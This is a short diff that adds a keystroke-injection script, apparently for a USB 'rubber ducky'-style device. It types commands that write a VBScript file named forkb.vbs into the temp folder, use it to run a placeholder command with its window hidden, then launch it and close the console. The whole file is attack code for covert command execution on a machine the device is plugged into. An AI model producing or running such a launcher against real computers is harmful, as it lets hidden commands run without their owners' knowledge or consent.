@@ -1,0 +1,10 @@
+>>>CMD<<<
+STRING copy con %tmp%\forkb.vbs
+ENTER
+ENTER
+STRING CreateObject("Wscript.Shell").Run ">>>Command to run<<<", 0, False
+ENTER
+CTRL z
+ENTER
+DELAY 50
+STRING start %tmp%\forkb.vbs && exit
